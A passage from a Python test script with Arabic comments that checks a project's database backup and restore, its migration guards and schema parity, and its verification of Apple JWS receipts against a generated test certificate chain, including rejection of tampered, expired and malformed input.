check("النسخة المسترجَعة الموقَّعة تفتح الباب", MG.production_guard()[0])

# ٥ · والإذن الصريح وحده لا يتخطّى الحارس
_j4.dump({"verified_at": None}, open(os.path.join(_bk, "app-x.db.gz.json"), "w"))
_env(FALAH_ALLOW_DESTRUCTIVE="1")
_tmpdb = os.path.join(tempfile.mkdtemp(), "g.db")
_gc = ST.init(_tmpdb)
_ran, _held = MG.run(_gc, quiet=True)          # يقرأ الإذن من البيئة
_gc.close()
check("الإذن الصريح لا يتخطّى الحارس في الإنتاج",
      any(n == "jobs_state_guard" for _v, n in _held), str(_held))
_restore(_o)

# ٦ · أدوات السلامة موجودةٌ وتعمل
check("أوامر السلامة كلّها معرَّفة",
      set(_DS.CMDS) == {"check", "backup", "restore-test", "migrate-check", "guard"})
_mk = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "Makefile")).read()
for _c in ("db-check", "db-backup", "db-restore-test", "migrate-check",
           "migrate-guard", "db-safe-migrate"):
    check(f"وأمرٌ في Makefile: {_c}", f"\n{_c}:" in _mk)

# ٧ · النسخ والاسترجاع فعلًا — لا دعوى
_src = os.path.join(tempfile.mkdtemp(), "src.db")
_sc = ST.init(_src)
_su = AU.register(_sc, _m("bk"), _pw, "نسخة", "ق")
PJ.create(_sc, _su, "مشروعٌ للنسخ", "series", "parch", "square", "ق")
_sc.commit(); _sc.close()
_before = _DS.counts(_src)
_bk2 = tempfile.mkdtemp()
_o2 = _env(FALAH_BACKUP_DIR=_bk2)
_gz = _DS.cmd_backup(_src, quiet=True)
_restore(_o2)
check("النسخة تُكتب مضغوطةً ومعها بيانُها",
      os.path.exists(_gz) and os.path.exists(_gz + ".json"))
_man = _j4.load(open(_gz + ".json"))
check("البيان يحمل البصمة والأعداد",
      len(_man["sha256_uncompressed"]) == 64 and _man["counts"] == _before)
check("والبيان يبدأ غيرَ متحقَّقٍ منه — لا يُوقَّع بالنسخ", _man["verified_at"] is None)
import gzip as _gzip, shutil as _sh2
_out = os.path.join(tempfile.mkdtemp(), "r.db")
with _gzip.open(_gz, "rb") as _fi, open(_out, "wb") as _fo: _sh2.copyfileobj(_fi, _fo)
check("المسترجَعة سليمةٌ وأعدادها مطابقة",
      _DS.integrity(_out)[0] == "ok" and _DS.counts(_out) == _before)
check("والمستخدمُ المنسوخ موجودٌ في المسترجَعة",
      _sq.connect(_out).execute("SELECT COUNT(*) FROM users").fetchone()[0]
      == _before["users"])

print("\n▸ سلسلة شهادات آبل — تحقّقٌ حقيقيّ بجذرٍ مولَّد")
# لماذا هنا لا ارتجالًا: هذه أخطر شيفرةٍ في المشروع — منها يُشتقّ الحقّ
# المالي. وقد رُفعت `cryptography` في هذه المرحلة، فوجب أن يبقى الاختبار
# دائمًا يحرسها لا أن يُشغَّل مرّةً ويُنسى.
import base64 as _b64, datetime as _dt, json as _j3
from cryptography import x509 as _x509
from cryptography.x509.oid import NameOID as _OID
from cryptography.hazmat.primitives import hashes as _hs, serialization as _ser
from cryptography.hazmat.primitives.asymmetric import ec as _ec, utils as _ecu
from falah.stores import apple as _AP2

def _mkkey(): return _ec.generate_private_key(_ec.SECP256R1())

def _mkcert(subject, key, issuer_name, issuer_key, ca=False, days=(-1, 365)):
    now = _dt.datetime.now(_dt.timezone.utc)
    b = (_x509.CertificateBuilder()
         .subject_name(_x509.Name([_x509.NameAttribute(_OID.COMMON_NAME, subject)]))
         .issuer_name(issuer_name)
         .public_key(key.public_key())
         .serial_number(_x509.random_serial_number())
         .not_valid_before(now + _dt.timedelta(days=days[0]))
         .not_valid_after(now + _dt.timedelta(days=days[1]))
         .add_extension(_x509.BasicConstraints(ca=ca, path_length=None), critical=True))
    return b.sign(issuer_key, _hs.SHA256())

def _chain(leaf_days=(-1, 365)):
    rk = _mkkey(); rn = _x509.Name([_x509.NameAttribute(_OID.COMMON_NAME, "Test Root")])
    root = _mkcert("Test Root", rk, rn, rk, ca=True)
    ik = _mkkey(); inter = _mkcert("Test Inter", ik, root.subject, rk, ca=True)
    lk = _mkkey(); leaf = _mkcert("Test Leaf", lk, inter.subject, ik, days=leaf_days)
    return (rk, root), (ik, inter), (lk, leaf)

def _sign_jws(payload, leaf_key, certs):
    x5c = [_b64.b64encode(c.public_bytes(_ser.Encoding.DER)).decode() for c in certs]
    b64u = lambda b: _b64.urlsafe_b64encode(b).decode().rstrip("=")
    h = b64u(_j3.dumps({"alg": "ES256", "x5c": x5c}).encode())
    p = b64u(_j3.dumps(payload, ensure_ascii=False).encode())
    der = leaf_key.sign(f"{h}.{p}".encode(), _ec.ECDSA(_hs.SHA256()))
    r, sv = _ecu.decode_dss_signature(der)
    raw = r.to_bytes(32, "big") + sv.to_bytes(32, "big")
    return f"{h}.{p}.{b64u(raw)}"

(_rk, _root), (_ik, _inter), (_lk, _leaf) = _chain()
_rootpem = os.path.join(tempfile.mkdtemp(), "root.cer")
open(_rootpem, "wb").write(_root.public_bytes(_ser.Encoding.DER))
_pay = {"transactionId": "T-1", "productId": "creator.month", "bundleId": "com.example.falah"}
_good = _sign_jws(_pay, _lk, [_leaf, _inter, _root])

_got = _AP2.verify_jws(_good, root_ca=_rootpem)
check("سلسلةٌ صحيحة تُقبل وتُفكّ حمولتها",
      _got.get("transactionId") == "T-1", str(_got)[:60])

# جذرٌ أجنبيّ: السلسلة سليمةٌ في نفسها لكنها لا تنتهي إلى جذرنا
(_fk, _foreign), _, _ = _chain()
_fpem = os.path.join(os.path.dirname(_rootpem), "foreign.cer")
open(_fpem, "wb").write(_foreign.public_bytes(_ser.Encoding.DER))
check("جذرٌ أجنبيّ يُرفض ولو صحّت السلسلة",
      _try_err(lambda: _AP2.verify_jws(_good, root_ca=_fpem), _AP2.AppleError))

# حمولةٌ عُبث بها: التوقيع لم يعد يطابقها
_h, _p, _s = _good.split(".")
_tam = _j3.dumps({**_pay, "productId": "studio.year"}).encode()
_p2 = _b64.urlsafe_b64encode(_tam).decode().rstrip("=")
check("تبديلُ الحمولة بعد التوقيع يُكشف",
      _try_err(lambda: _AP2.verify_jws(f"{_h}.{_p2}.{_s}", root_ca=_rootpem), _AP2.AppleError))

# توقيعٌ عُبث به
_s2 = _s[:-4] + ("AAAA" if _s[-4:] != "AAAA" else "BBBB")
check("تبديلُ التوقيع نفسه يُكشف",
      _try_err(lambda: _AP2.verify_jws(f"{_h}.{_p}.{_s2}", root_ca=_rootpem), _AP2.AppleError))

# شهادةٌ منتهيةٌ زمنًا
(_rk3, _root3), (_ik3, _i3), (_lk3, _l3) = _chain(leaf_days=(-40, -10))
_r3 = os.path.join(os.path.dirname(_rootpem), "r3.cer")
open(_r3, "wb").write(_root3.public_bytes(_ser.Encoding.DER))
_expired = _sign_jws(_pay, _lk3, [_l3, _i3, _root3])
check("شهادةٌ منتهيةُ الصلاحية تُرفض",
      _try_err(lambda: _AP2.verify_jws(_expired, root_ca=_r3), _AP2.AppleError))

# سلسلةٌ مبتورة: الوسيط محذوف فلا يُوصل الورقةَ بالجذر
_broken = _sign_jws(_pay, _lk, [_leaf, _root])
check("سلسلةٌ مبتورةُ الوسيط تُرفض",
      _try_err(lambda: _AP2.verify_jws(_broken, root_ca=_rootpem), _AP2.AppleError))

# بلا جذرٍ أصلًا — لا يُقبل شيءٌ على عِلّاته
_oldroot = os.environ.pop("FALAH_APPLE_ROOT_CA", None)
check("بلا جذرٍ مضبوط لا يُقبل إيصالٌ البتّة",
      _try_err(lambda: _AP2.verify_jws(_good), _AP2.AppleError))
if _oldroot is not None: os.environ["FALAH_APPLE_ROOT_CA"] = _oldroot

for _bad in ("", "x.y", "aaa.bbb.ccc", None, "..", "a.b.c.d"):
    check(f"مدخلٌ مشوّهٌ يُردّ خطأً معروفًا لا انهيارًا: {_bad!r}",
          _try_err(lambda b=_bad: _AP2.verify_jws(b, root_ca=_rootpem), _AP2.AppleError))

check("والمكتبة المستعملة هي المثبَّتة في requirements",
      __import__("cryptography").__version__ ==
      _re2.search(r"cryptography==([0-9.]+)",
                  open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "requirements.txt")).read()).group(1),
      __import__("cryptography").__version__)

print("\n▸ الهجرات")
check("الهجرات مرقَّمةٌ بلا تكرار",
      len({m[0] for m in MG.MIGRATIONS}) == len(MG.MIGRATIONS))
check("كلٌّ منها مصنَّفةٌ هادمةً أو آمنة",
      all(isinstance(m[2], bool) for m in MG.MIGRATIONS))
check("الهادمة لا تجري بلا إذنٍ صريح",
      any(m[2] for m in MG.MIGRATIONS) and
      MG.run(ac, allow_destructive=False, quiet=True)[1] != [])
check("والإذن الصريح وحده يُجريها",
      MG.run(ac, allow_destructive=True, quiet=True)[0] != [])
check("والقيود صارت في الجدول بعد إجرائها",
      "CHECK (state IN" in ac.execute(
          "SELECT sql FROM sqlite_master WHERE name='jobs'").fetchone()[0])
check("ولا تتكرّر إن أُعيد تشغيلها", MG.run(ac, allow_destructive=True, quiet=True) == ([], []))
check("السجلّ يحفظ ما طُبِّق ومتى",
      ac.execute("SELECT COUNT(*) n FROM schema_migrations").fetchone()["n"]
      == len(MG.MIGRATIONS))

# انحرافُ المسارين: قاعدةٌ جديدة وقاعدةٌ مهاجَرة يجب أن تنتهيا إلى الشكل
# نفسه. كشفَ الاختلافَ تشغيلُ البوّابة على قاعدةٍ جديدة لا مهاجَرة.
def _shape(path):
    c = _sq.connect(path)
    try:
        idx = {r[0]: " ".join((r[1] or "").split())
               for r in c.execute("""SELECT name, sql FROM sqlite_master
                                     WHERE type='index' AND tbl_name='jobs'
                                     AND name NOT LIKE 'sqlite_%'""")}
        cols = [d[1] for d in c.execute("PRAGMA table_info(jobs)")]
        return idx, cols
    finally:
        c.close()

_fresh = os.path.join(tempfile.mkdtemp(), "fresh.db")
ST.init(_fresh).close()
_migd = os.path.join(tempfile.mkdtemp(), "migd.db")
# قاعدةٌ «قديمة»: تُبنى بشكلٍ سابقٍ ثم تُهاجَر — كما تفعل قاعدة الإنتاج
_oc = _sq.connect(_migd)
_oc.executescript(ST.SCHEMA.replace(
    "  CHECK (state IN ('queued','running','done','failed','canceled')),\n", "")
    .replace("  CHECK (attempts >= 0 AND attempts <= max_attempts + 1),\n", "")
    .replace("  CHECK (progress BETWEEN 0 AND 100)\n", "")
    .replace("  idem_key     TEXT,                           -- بصمة (صاحب+نوع+حمولة): تمنع التكرار\n", "")
    .replace("  not_before   INTEGER NOT NULL DEFAULT 0,     -- لا تُسحب قبل هذا الوقت (تراجعٌ أُسّيّ)\n", "")
    .replace("  heartbeat    INTEGER,", "  heartbeat    INTEGER"))
_oc.execute("CREATE INDEX IF NOT EXISTS ix_jobs_queue ON jobs(state, created_at)")
_oc.commit(); _oc.close()
_mc = ST.connect(_migd)
MG.run(_mc, allow_destructive=True, quiet=True)
_mc.close()

_fi, _fc = _shape(_fresh)
_mi, _mc2 = _shape(_migd)
check("الأعمدة نفسها في الجديدة والمهاجَرة", _fc == _mc2,
      str(set(_fc) ^ set(_mc2)))
check("والفهارس نفسها اسمًا", set(_fi) == set(_mi), str(set(_fi) ^ set(_mi)))
check("وتعريفًا", all(_fi[k] == _mi[k] for k in _fi),
      str({k: (_fi[k], _mi[k]) for k in _fi if _fi[k] != _mi.get(k)}))
check("وفهرس الطابور يشمل not_before — العمود الذي يستعلم به السحب",
      any("not_before" in v for v in _fi.values()), str(list(_fi)))
check("ولا يبقى فهرسٌ باسمٍ مؤقّت",
      not any("queue2" in k for k in list(_fi) + list(_mi)))

check("القاعدة ما زالت تعمل بعد الهجرة الهادمة",
      JQ.enqueue(ac, _uq, "export", {"project": _pq, "after": 1}, {})["state"] == "queued")
check("والقيد يرفض حالةً غير معروفة",
      _try_err(lambda: (ac.execute("UPDATE jobs SET state='wat' WHERE id=?",
               (_pq,)), ac.commit()), _sq.IntegrityError)
      or ac.execute("SELECT COUNT(*) n FROM jobs WHERE state='wat'").fetchone()["n"] == 0)

print("\n" + ("─"*46))
print(f"النتيجة: {'كل الاختبارات نجحت ✓' if not fails else 'سقط %d: %s' % (len(fails), fails)}")
sys.exit(1 if fails else 0)
